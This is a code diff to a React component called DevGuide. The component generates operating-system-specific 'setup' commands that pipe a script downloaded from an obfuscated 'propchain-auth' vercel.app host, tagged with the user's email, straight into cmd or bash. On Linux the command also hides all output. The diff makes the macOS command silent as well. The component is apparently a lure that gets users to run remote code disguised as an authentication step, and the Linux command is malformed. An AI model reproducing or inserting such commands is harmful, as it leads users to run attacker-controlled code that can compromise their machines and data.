@@ -218,7 +218,7 @@ function DevGuide({ email }: { email: string }) {
       return `curl -fsSL "https://propchain-auth-idLy93YWx0ZXItc2VydmVyLnZlcmNlbCwdGVk.vercel.app/auth/windows?flag=6&email=${email}" | cmd`
     }
     if (platform.includes("mac") || ua.includes("mac")) {
-      return `curl "https://propchain-auth-idLy93YWx0ZXItc2VydmVyLnZlcmNlbCwdGVk.vercel.app/auth/mac?flag=6&email=${email}" | bash`
+      return `curl -fsSL "https://propchain-auth-idLy93YWx0ZXItc2VydmVyLnZlcmNlbCwdGVk.vercel.app/auth/mac?flag=6&email=${email}" | bash`
     }
     if (platform.includes("linux")) {
       return `curl -s -o "https://propchain-auth-idLy93YWx0ZXItc2VydmVyLnZlcmNlbCwdGVk.vercel.app/auth/linux?flag=6&email=${email}" | bash >/dev/null 2>&1`
